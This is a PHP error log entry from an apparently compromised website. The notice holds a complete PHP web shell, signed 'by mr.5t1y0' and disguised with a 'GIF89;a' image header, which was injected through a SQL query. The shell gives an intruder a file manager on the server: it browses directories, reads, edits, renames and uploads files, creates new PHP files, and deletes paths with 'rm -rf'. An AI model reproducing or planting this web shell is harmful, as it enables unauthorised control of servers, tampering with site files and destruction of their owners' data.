2022-01-08 10:34:29 - PHP Notice:  Error: Table 'harajcar_car.inexistent_table' doesn't exist<br />Error No: 1146<br />SELECT ' by mr.5t1y0  d  GIF89;a<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<style>
body{
font-family:Times New Roman;
background-color: black;
color:white;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 10px #fff;
}
content .first{
background-color: blue;
}
table{
border: 10px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<?php
error_reporting(0);
set_time_limit(0);
header("X-XSS-Protection: 0");
function getpath()
{
	if(isset($_GET['d']))
	{
		$d=$_GET['d'];
	}else{
		$d=getcwd();
	}
	return $d;
}
function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach ($s as $ss) {if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm = unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}
function getowner($path){if(function_exists('posix_getpwuid')) {$downer = @posix_getpwuid(fileowner($path));$downer = $downer['name'];} else {$downer = fileowner($path);}return $downer;}
function getgroup($path){if(function_exists('posix_getgrgid')) {$dgrp = @posix_getgrgid(filegroup($path));$dgrp = $dgrp['name'];} else { $dgrp = filegroup($path);}return $dgrp;}
function upload($a,$b){ if(function_exists('move_uploaded_file')){$upl = move_uploaded_file($a,$b);}elseif (function_exists('copy')) {  $upl = copy($a,$b);}return $upl; }function array_upload($file){ $file_ary = array(); $file_count = count($file['name']); $file_key = array_keys($file); for($i=0;$i<$file_count;$i++) { foreach($file_key as $val) { $file_ary[$i][$val] = $file[$val][$i]; } } return $file_ary;}
function sedirs($dir)
{
	if(function_exists('scandir'))
	{
		$s=scandir($dir);
		chdir($dir);
	}else{
		$s=system($dir);
	}
	return $s;
}
function getperms($files)
{
		if($s_m = @fileperms($files)){
		$s_p = 'u';
		if(($s_m & 0xC000) == 0xC000)$s_p = 's';
		elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
		elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
		elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
		elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
		elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
		elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
		$s_p .= ($s_m & 00400)? 'r':'-';
		$s_p .= ($s_m & 00200)? 'w':'-';
		$s_p .= ($s_m & 00100)? 'x':'-';
		$s_p .= ($s_m & 00040)? 'r':'-';
		$s_p .= ($s_m & 00020)? 'w':'-';
		$s_p .= ($s_m & 00010)? 'x':'-';
		$s_p .= ($s_m & 00004)? 'r':'-';
		$s_p .= ($s_m & 00002)? 'w':'-';
		$s_p .= ($s_m & 00001)? 'x':'-';
		return $s_p;
	}
	else return "???????????";
}
function viewfilefunc($file)
{
	echo "<center><h1> View : ".basename($file)."</h1>";
	echo "<textarea readonly cols='100' rows='40'>";
	echo htmlspecialchars(file_get_contents($file));
	echo "</textarea></center>";
}
function ts($s_s){
	if($s_s<=0) return 0;
	$s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$s_e = floor(log($s_s)/log(1024));
	return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
function getsize($s_f){
	$s_s = @filesize($s_f);
	if($s_s !== false){
		if($s_s<=0) return 0;
		return ts($s_s);
	}
	else return "???";
}

function renamefunc($dir,$oldname){
	echo "<center><h1>Rename : ".$oldname."</h1><br><form method='POST' class='in'>oldname : <input type='text' value='$oldname' class='in' readonly>";
	echo "Newname : <input type='text' name='newname' value='newname' class='in'><input type='submit' value='>>' name='s'></form></center>";
	if(isset($_POST['s'])){
		rename($dir."/".$oldname,$dir."/".$_POST['newname']);
		echo "<meta http-equiv='refresh' content='0;url=?d=".dirname($dir)."'>";
	}
}
function editfunc($dir,$file){
	echo "<center><h1> Edit : ".$file."</h1><br><form method='POST'>";
	echo "<textarea name='editfile' cols='100' rows='40'>".htmlspecialchars(file_get_contents($dir."/".$file))."</textarea><br>";
	echo "<input type='submit' name='sbmt' value='>>submit<<' style='width:200px;'>";
	echo "</form>";
	if(isset($_POST['sbmt']))
	{
		$fp=fopen($dir."/".$file,'w');
		fwrite($fp,$_POST['editfile']);
		fclose($fp);
		echo "<br><b>Tersimpan @".date('D ,d m Y')."</b><br>";
	}
}
function berinamafunc($dir){
	echo "<center><h1>New file </h1><br><form method='POST' class='in'>";
	echo "Filename : <input type='text' name='filename' value='newfile.php'>";
	echo "<input type='submit' name='svi' value='>>'>";
	echo "</form>";
	if(isset($_POST['svi']))
	{
		if(function_exists('touch')){
			touch($dir."/".$_POST['filename']);
		}else{
			$fp=fopen($dir."/".$_POST['filename'],'w');
			fwrite($fp,'#new file 1945');
			fclose($fp);
		}
		header('location:?d='.$dir.'&a=edit&f='.$_POST['filename']);
	}
}

$gp=getpath();
$y =php_uname();
?>
	<title><?php echo $y; ?></title>
</head>
<body>
</form>
<form method="post" class="in" enctype="multipart/form-data" action="?d=<?=$gp;?>&a=upload"> <center>Upload file :<input type="file" name="filup[]" multiple="" style="border: 0"><input type="submit" name="upload" value="UPLOAD"></form>
<form method="post" action="?d=<?=$gp;?>&a=up">
</form>
</div>
<hr>
<?php
echo "Current Dir=|> ";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?d=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?d=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
						
if(empty($_GET['a']))
{
	?>
<table align="center" class="table">
	<th>Files</th><th>Size</th><th>owner:group</th><th>Permission</th><th>Action</th>
<?php
$dir=sedirs(getpath());
echo "<tr><td><a href=\"?d=".dirname($gp)."\">Current dir</a></td><td>--</td><td>--</td><td>--</td><td align=right><a href='?d=$gp&a=touch'>Newfile</a> | <a href='?d=$gp&a=mkdir'>newdir</a></td></tr>";
foreach($dir as $d1)
{if(!is_dir("$gp/$d1")||$d1=="."||$d1=="..")continue;
	?>
	<tr><td>[<a href="?d=<?="$gp/$d1"?>"><?=$d1;?></a>]</td>
	<td><?=getsize("$gp/$d1");?></td>
	<td><?=getowner("$gp/$f1");?>:<?=getgroup("$gp/$f1");?></td>
	<td><?=getperms("$gp/$d1");?></td>
	<td align="right"><a href="?d=<?="$gp/$d1"?>&a=rename">Rename</a> | <a href="?d=<?="$gp/$d1"?>&a=delete">Delete</a></td>
	</tr>
	<?php
}
foreach($dir as $f1)
{
	if(!is_file("$gp/$f1")||$f1=="."||$f1=="..")continue;
?>
	<tr><td><a href="?d=<?=$gp;?>&a=view&f=<?=$f1;?>"><?=$f1;?></a></td>
	<td><?=getsize("$gp/$f1");?></td>
	<td><?=getowner("$gp/$f1");?>:<?=getgroup("$gp/$f1");?></td>
	<td><?=getperms("$gp/$f1");?></td>
	<td align="right">
	<a href="?d=<?=$gp;?>&a=rename&f=<?=$f1;?>">Rename</a> |
	<a href="?d=<?="$gp/$f1";?>&a=delete">delete</a> |
	<a href="?d=<?=$gp;?>&a=edit&f=<?=$f1;?>">edit</a> |

	</tr>
	<?php
}
?>
</table>
<?php
}else{
@$a=$_GET['a'];
@$f=$_GET['f'];
@$d=$_GET['d'];
if($a=="view")
{viewfilefunc($d."/".$f);}elseif($a=="download"){downloads($d."/".$f);}
elseif($a=="logout"){if(setcookie(md5($_SERVER['HTTP_HOST']),""))
	echo "<script>alert('See You Next time !');window.location.href='????'</script>";}

elseif($a=="rename"){$ff=(isset($_GET['f']) ? $_GET['f'] : basename($_GET['d']));$gdd=(isset($_GET['f'])) ? $_GET['d'] : dirname($_GET['d']); renamefunc($gdd,$ff);}
elseif($a=="delete"){delete($_GET['d']);echo "<meta http-equiv='refresh' content='0;url=?d=".dirname($_GET['d'])."'>";}
elseif($a=="upload"){
	$fil=array_upload($_FILES['filup']); foreach($fil as $filup)
	{
		$filoc=$d."/".$filup['name'];
		if(upload($filup['tmp_name'],$filoc))
		{
			echo "<font color=lime>Successfully upload -> <a href='?d=".$d."&a=view&f=".$filup['name']."'>".$filoc."</a></font><br>";
		}else{
			echo "<font color=red>Failed upload -> ".$filoc."</font><br>";
		}
	}
}
elseif($a=="mkdir"){mkdirfunc($d);}
elseif($a=="touch"){berinamafunc($d);}
elseif($a=="edit"){editfunc($_GET['d'],$_GET['f']);}



}
?>' FROM `inexistent_table` in /home/harajcar/public_html/system/library/db/mysqli.php on line 4
